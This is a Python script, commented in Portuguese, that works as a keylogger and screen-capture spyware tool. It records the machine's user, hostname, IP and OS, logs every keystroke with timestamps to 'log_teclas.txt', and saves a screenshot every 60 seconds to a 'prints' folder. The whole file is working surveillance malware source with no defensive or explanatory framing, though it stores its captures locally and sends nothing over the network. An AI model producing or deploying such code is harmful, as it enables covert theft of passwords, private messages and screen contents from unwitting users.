import os
import socket
import platform
import getpass
import threading
import time
from datetime import datetime
from pynput import keyboard
from PIL import ImageGrab

# Arquivo onde o log será salvo
log_file = "log_teclas.txt"

# CAPTURA DE INFORMAÇÕES DO SISTEMA
def capturar_infos():
    infos = {
        "Usuário": getpass.getuser(),
        "Hostname": socket.gethostname(),
        "IP": socket.gethostbyname(socket.gethostname()),
        "Sistema": platform.system(),
        "Versão": platform.version(),
        "Data": datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    }

    with open(log_file, "a", encoding="utf-8") as f:
        f.write("=== Informações do Sistema ===\n")
        for chave, valor in infos.items():
            f.write(f"{chave}: {valor}\n")
        f.write("\n--- Início da Captura de Teclas ---\n\n")

# CAPTURA DE TECLAS
def on_press(tecla):
    try:
        tecla_press = tecla.char
    except AttributeError:
        tecla_press = f"[{tecla}]"

    with open(log_file, "a", encoding="utf-8") as f:
        f.write(f"{datetime.now().strftime('%H:%M:%S')} - {tecla_press}\n")

# CAPTURA DE SCREENSHOTS
def capturar_screenshot(pasta="prints", intervalo=60):
    if not os.path.exists(pasta):
        os.makedirs(pasta)

    while True:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        caminho = os.path.join(pasta, f"screenshot_{timestamp}.png")
        imagem = ImageGrab.grab()
        imagem.save(caminho)
        time.sleep(intervalo)

# INÍCIO DO SCRIPT
if __name__ == "__main__":
    # Captura as infos da máquina no começo
    capturar_infos()

    # Inicia a thread para screenshots automáticas
    thread_screenshot = threading.Thread(target=capturar_screenshot, args=("prints", 60))
    thread_screenshot.daemon = True
    thread_screenshot.start()

    # Inicia o keylogger
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()